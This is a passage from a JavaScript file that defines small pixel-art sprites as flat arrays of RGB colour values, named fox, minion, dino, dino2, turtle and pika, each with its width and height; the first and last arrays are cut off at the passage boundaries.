121, 4, 255, 121, 4, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255];
fox.width = 28;
fox.height = 26;
var minion = [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 252, 16, 255, 252, 16, 255, 252, 16, 153, 153, 153, 153, 153, 153, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 252, 16, 255, 252, 16, 255, 252, 16, 153, 153, 153, 255, 255, 255, 255, 255, 255, 153, 153, 153, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 153, 153, 153, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 153, 153, 153, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 153, 153, 153, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 153, 153, 153, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 252, 16, 255, 252, 16, 255, 252, 16, 153, 153, 153, 255, 255, 255, 255, 255, 255, 153, 153, 153, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 255, 255, 255, 255, 255, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 252, 16, 153, 153, 153, 153, 153, 153, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 255, 255, 255, 255, 255, 255, 252, 16, 255, 252, 16, 0, 0, 0, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 252, 16, 0, 0, 0, 255, 252, 16, 255, 252, 16, 255, 255, 255, 255, 255, 255, 255, 252, 16, 255, 252, 16, 255, 252, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 255, 255, 255, 255, 255, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 252, 16, 255, 252, 16, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 252, 16, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 255, 252, 16, 255, 255, 255, 255, 255, 255, 255, 252, 16, 255, 252, 16, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 255, 252, 16, 255, 252, 16, 255, 255, 255, 255, 255, 255, 255, 252, 16, 255, 252, 16, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 255, 252, 16, 255, 252, 16, 255, 255, 255, 255, 255, 255, 255, 252, 16, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 255, 252, 16, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255];
minion.width = 12;
minion.height = 19;
var dino = [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 177, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 177, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 177, 0, 0, 0, 0, 0, 177, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 0, 0, 177, 0, 0, 0, 0, 0, 255, 0, 0, 177, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 177, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 223, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 177, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 177, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 177, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 45, 134, 153, 76, 223, 255, 76, 223, 255, 76, 223, 255, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 177, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 177, 0, 0, 0, 0, 0, 255, 0, 0, 177, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 223, 255, 76, 223, 255, 76, 223, 255, 76, 223, 255, 45, 134, 153, 45, 134, 153, 0, 0, 0, 0, 177, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 177, 0, 0, 0, 0, 0, 255, 0, 0, 177, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 76, 223, 255, 76, 223, 255, 45, 134, 153, 76, 223, 255, 45, 134, 153, 45, 134, 153, 76, 223, 255, 76, 223, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 177, 0, 0, 0, 0, 0, 177, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 45, 134, 153, 76, 223, 255, 76, 223, 255, 76, 223, 255, 76, 223, 255, 76, 223, 255, 76, 223, 255, 76, 223, 255, 76, 223, 255, 76, 223, 255, 0, 0, 0, 0, 177, 0, 0, 177, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 45, 134, 153, 0, 0, 0, 0, 0, 0, 0, 0, 0, 45, 134, 153, 76, 223, 255, 76, 223, 255, 76, 223, 255, 45, 134, 153, 76, 223, 255, 76, 223, 255, 76, 223, 255, 76, 223, 255, 76, 223, 255, 45, 134, 153, 0, 0, 0, 0, 0, 0, 0, 0, 0, 45, 134, 153, 45, 134, 153, 45, 134, 153, 0, 0, 0, 0, 0, 0, 76, 223, 255, 76, 223, 255, 76, 223, 255, 76, 223, 255, 45, 134, 153, 76, 223, 255, 0, 0, 0, 0, 0, 0, 76, 223, 255, 76, 223, 255, 76, 223, 255, 45, 134, 153, 45, 134, 153, 45, 134, 153, 45, 134, 153, 0, 0, 0, 45, 134, 153, 255, 255, 255, 0, 0, 0, 0, 0, 0, 45, 134, 153, 76, 223, 255, 76, 223, 255, 76, 223, 255, 76, 223, 255, 0, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 45, 134, 153, 0, 0, 0, 45, 134, 153, 45, 134, 153, 0, 0, 0, 76, 223, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 45, 134, 153, 76, 223, 255, 76, 223, 255, 76, 223, 255, 0, 0, 0, 217, 0, 0, 255, 255, 255, 45, 134, 153, 0, 0, 0, 45, 134, 153, 45, 134, 153, 45, 134, 153, 45, 134, 153, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 45, 134, 153, 45, 134, 153, 45, 134, 153, 45, 134, 153, 45, 134, 153, 0, 0, 0, 45, 134, 153, 45, 134, 153, 45, 134, 153, 45, 134, 153, 45, 134, 153, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 45, 134, 153, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255];
dino.width = 20;
dino.height = 17;
var dino2 = [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 130, 3, 255, 130, 3, 255, 130, 3, 255, 76, 8, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 76, 8, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 130, 3, 255, 130, 3, 255, 130, 3, 255, 130, 3, 255, 130, 3, 255, 76, 8, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 76, 8, 255, 76, 8, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 130, 3, 255, 130, 3, 255, 130, 3, 255, 130, 3, 255, 130, 3, 255, 130, 3, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 76, 8, 255, 76, 8, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 130, 3, 255, 130, 3, 255, 130, 3, 255, 130, 3, 255, 130, 3, 255, 130, 3, 255, 130, 3, 255, 76, 8, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 76, 8, 255, 76, 8, 255, 130, 3, 255, 76, 8, 0, 0, 0, 0, 0, 0, 255, 130, 3, 255, 130, 3, 255, 130, 3, 255, 130, 3, 255, 255, 255, 0, 0, 0, 255, 130, 3, 255, 130, 3, 255, 76, 8, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 76, 8, 255, 76, 8, 247, 255, 4, 255, 76, 8, 0, 0, 0, 0, 0, 0, 255, 130, 3, 255, 130, 3, 255, 130, 3, 255, 130, 3, 0, 0, 255, 0, 0, 0, 255, 130, 3, 255, 76, 8, 255, 76, 8, 255, 76, 8, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 76, 8, 247, 255, 4, 247, 255, 4, 255, 76, 8, 0, 0, 0, 0, 0, 0, 255, 130, 3, 255, 130, 3, 255, 130, 3, 255, 130, 3, 0, 0, 0, 0, 0, 0, 255, 130, 3, 255, 76, 8, 255, 76, 8, 255, 76, 8, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 247, 255, 4, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 76, 8, 255, 130, 3, 255, 130, 3, 255, 130, 3, 255, 130, 3, 255, 76, 8, 255, 76, 8, 255, 76, 8, 255, 76, 8, 255, 76, 8, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 130, 3, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 76, 8, 255, 76, 8, 255, 76, 8, 255, 76, 8, 255, 76, 8, 255, 76, 8, 255, 76, 8, 255, 76, 8, 255, 76, 8, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 130, 3, 255, 130, 3, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 76, 8, 255, 76, 8, 0, 0, 0, 255, 76, 8, 255, 76, 8, 255, 76, 8, 0, 0, 0, 0, 0, 0, 255, 76, 8, 255, 130, 3, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 247, 255, 4, 247, 255, 4, 0, 0, 0, 255, 130, 3, 255, 130, 3, 255, 76, 8, 255, 76, 8, 255, 76, 8, 0, 0, 0, 255, 76, 8, 255, 130, 3, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 247, 255, 4, 247, 255, 4, 247, 255, 4, 0, 0, 0, 0, 0, 0, 255, 76, 8, 255, 76, 8, 255, 76, 8, 0, 0, 0, 255, 76, 8, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 133, 132, 128, 0, 0, 0, 247, 255, 4, 247, 255, 4, 247, 255, 4, 255, 76, 8, 255, 76, 8, 255, 76, 8, 255, 76, 8, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 130, 3, 255, 130, 3, 255, 76, 8, 255, 76, 8, 255, 76, 8, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 76, 8, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 76, 8, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255];
dino2.width = 21;
dino2.height = 18;
var turtle = [255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 113, 177, 207, 113, 177, 207, 113, 177, 207, 113, 177, 207, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 113, 177, 207, 113, 177, 207, 113, 177, 207, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 113, 177, 207, 113, 177, 207, 113, 177, 207, 113, 177, 207, 113, 177, 207, 113, 177, 207, 113, 177, 207, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 113, 177, 207, 113, 177, 207, 113, 177, 207, 113, 177, 207, 113, 177, 207, 0, 0, 0, 255, 255, 255, 0, 0, 0, 113, 177, 207, 113, 177, 207, 113, 177, 207, 113, 177, 207, 113, 177, 207, 113, 177, 207, 113, 177, 207, 0, 0, 0, 139, 85, 39, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 113, 177, 207, 113, 177, 207, 113, 177, 207, 0, 0, 0, 113, 177, 207, 0, 0, 0, 0, 0, 0, 139, 85, 39, 113, 177, 207, 113, 177, 207, 113, 177, 207, 113, 177, 207, 113, 177, 207, 113, 177, 207, 113, 177, 207, 113, 177, 207, 139, 85, 39, 139, 85, 39, 139, 85, 39, 0, 0, 0, 113, 177, 207, 113, 177, 207, 113, 177, 207, 0, 0, 0, 113, 177, 207, 113, 177, 207, 0, 0, 0, 0, 0, 0, 113, 177, 207, 113, 177, 207, 113, 177, 207, 113, 177, 207, 255, 255, 255, 0, 0, 0, 113, 177, 207, 113, 177, 207, 113, 177, 207, 225, 216, 199, 139, 85, 39, 139, 85, 39, 139, 85, 39, 0, 0, 0, 113, 177, 207, 113, 177, 207, 0, 0, 0, 113, 177, 207, 0, 0, 0, 255, 255, 255, 0, 0, 0, 113, 177, 207, 113, 177, 207, 113, 177, 207, 113, 177, 207, 0, 0, 0, 139, 85, 39, 113, 177, 207, 113, 177, 207, 113, 177, 207, 225, 216, 199, 139, 85, 39, 139, 85, 39, 139, 85, 39, 0, 0, 0, 113, 177, 207, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 113, 177, 207, 113, 177, 207, 113, 177, 207, 0, 0, 0, 139, 85, 39, 113, 177, 207, 113, 177, 207, 113, 177, 207, 0, 0, 0, 225, 216, 199, 139, 85, 39, 139, 85, 39, 139, 85, 39, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 113, 177, 207, 113, 177, 207, 113, 177, 207, 113, 177, 207, 0, 0, 0, 0, 0, 0, 113, 177, 207, 113, 177, 207, 225, 216, 199, 139, 85, 39, 139, 85, 39, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 113, 177, 207, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 113, 177, 207, 113, 177, 207, 113, 177, 207, 113, 177, 207, 225, 216, 199, 139, 85, 39, 139, 85, 39, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 252, 255, 29, 252, 255, 29, 0, 0, 0, 113, 177, 207, 113, 177, 207, 113, 177, 207, 0, 0, 0, 225, 216, 199, 139, 85, 39, 139, 85, 39, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 252, 255, 29, 252, 255, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 225, 216, 199, 139, 85, 39, 139, 85, 39, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 113, 177, 207, 0, 0, 0, 252, 255, 29, 252, 255, 29, 252, 255, 29, 252, 255, 29, 252, 255, 29, 0, 0, 0, 225, 216, 199, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 252, 255, 29, 252, 255, 29, 113, 177, 207, 0, 0, 0, 225, 216, 199, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 113, 177, 207, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 113, 177, 207, 113, 177, 207, 113, 177, 207, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255];
turtle.width = 21;
turtle.height = 17;
var pika = [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 143, 113, 8, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 247, 255, 4, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 247, 255, 4, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 247, 255, 4, 255, 201, 15, 255, 201, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 247, 255, 4, 247, 255, 4, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 247, 255, 4, 255, 201, 15, 255, 201, 15, 255, 201, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 247, 255, 4, 255, 201, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 143, 113, 8, 143, 113, 8, 0, 0, 0, 255, 201, 15, 255, 201, 15, 255, 201, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 0, 0, 0, 0, 0, 0, 247, 255, 4, 247, 255, 4, 143, 113, 8, 0, 0, 0, 255, 201, 15, 255, 201, 15, 255, 201, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 0, 0, 0, 0, 0, 0, 255, 201, 15, 255, 201, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 255, 201, 15, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 201, 15, 255, 201, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 201, 15, 255, 201, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 255, 255, 255, 0, 0, 0, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 0, 0, 0, 0, 0, 0, 255, 201, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 247, 255, 4, 247, 255, 4, 247, 255, 4, 0, 0, 0, 0, 0, 0, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 255, 201, 15, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 